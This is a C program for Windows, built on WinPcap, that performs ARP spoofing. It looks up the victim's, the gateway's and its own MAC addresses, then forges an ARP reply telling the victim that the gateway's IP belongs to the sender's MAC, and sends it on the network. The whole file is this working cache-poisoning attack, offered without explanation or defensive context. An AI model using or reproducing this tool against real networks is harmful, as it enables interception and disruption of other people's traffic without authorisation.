#include "pcap.h"
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <winsock2.h>
#include <iphlpapi.h>
#include <Iptypes.h>
#include <windows.h>
#pragma comment(lib, "Iphlpapi.lib")
#pragma comment (lib, "wpcap.lib")
#pragma comment (lib, "ws2_32.lib" )
#define RIGHT_SHIFT(value, bytes) ((value) >> ((bytes) << 3))
#define GET_HEX(value)    ((value) & 0xFF)
u_char packet[100], MyMac[6], VicMac[6], GateMac[6], Dip[4], Sip[4], Gip[4];
pcap_t *pickedDev;
PIP_ADAPTER_INFO pAdapterInfo, pAdapter;
ULONG buflen, PhysAddrLen = 6;
IPAddr DestIp = 0, SrcIp = 0, GateIp = 0;
int main(int argc, char *argv[])
{
	pcap_if_t *allDevice, *device;
	char errorMSG[256];
	int i, j=0;
	pAdapterInfo = (IP_ADAPTER_INFO *)malloc(sizeof(IP_ADAPTER_INFO));
	buflen = sizeof(IP_ADAPTER_INFO);
	if (GetAdaptersInfo(pAdapterInfo, &buflen) == ERROR_BUFFER_OVERFLOW)
	{
		free(pAdapterInfo);
		pAdapterInfo = (IP_ADAPTER_INFO *)malloc(buflen);
	}
	if (GetAdaptersInfo(pAdapterInfo, &buflen) == NO_ERROR)
		pAdapter = pAdapterInfo;
	DestIp = inet_addr(argv[1]);
	SrcIp = inet_addr(pAdapter->IpAddressList.IpAddress.String);
	GateIp = inet_addr(pAdapter->GatewayList.IpAddress.String);
	SendARP(SrcIp, SrcIp, MyMac, &PhysAddrLen);
	SendARP(DestIp, SrcIp, VicMac, &PhysAddrLen);
	SendARP(GateIp, SrcIp, GateMac, &PhysAddrLen);
	i = 4;
	while (i--)
		Dip[i] = GET_HEX(RIGHT_SHIFT(DestIp, i));
	i = 4;
	while (i--)
		Sip[i] = GET_HEX(RIGHT_SHIFT(SrcIp, i));
	i = 4;
	while (i--)
		Gip[i] = GET_HEX(RIGHT_SHIFT(GateIp, i));

	for (i = 0; i < 6; i++)
		packet[i] = VicMac[j++];
	j = 0;
	for (; i < 12; i++)
		packet[i] = MyMac[j++];
	packet[12] = 0x08;
	packet[13] = 0x06;
	packet[14] = 0x00;
	packet[15] = 0x01;
	packet[16] = 0x08;
	packet[17] = 0x00;
	packet[18] = 0x06;
	packet[19] = 0x04;
	packet[20] = 0x00;
	packet[21] = 0x02;
	for (i = 22; i < 42; i++)
	{
		if (j == 6)
			j = 0;
		if (i < 28)
			packet[i] = MyMac[j++];
		if (i >= 28 && i < 32)
			packet[i] = Gip[j++];
		if (i >= 32 && i < 38)
		{
			if (i == 32 && j == 4)
				j = 0;
			packet[i] = VicMac[j++];
		}
		if (i >= 38 && i < 42)
			packet[i] = Dip[j++];
	}
	if ((pcap_findalldevs(&allDevice, errorMSG)) == -1)
		printf("장치 검색 오류");
	device = allDevice;
	pickedDev = pcap_open_live(device->name, 65536, 0, 1000, errorMSG);
	pcap_freealldevs(allDevice);
	pcap_sendpacket(pickedDev, packet, 42);
	return 0;
}
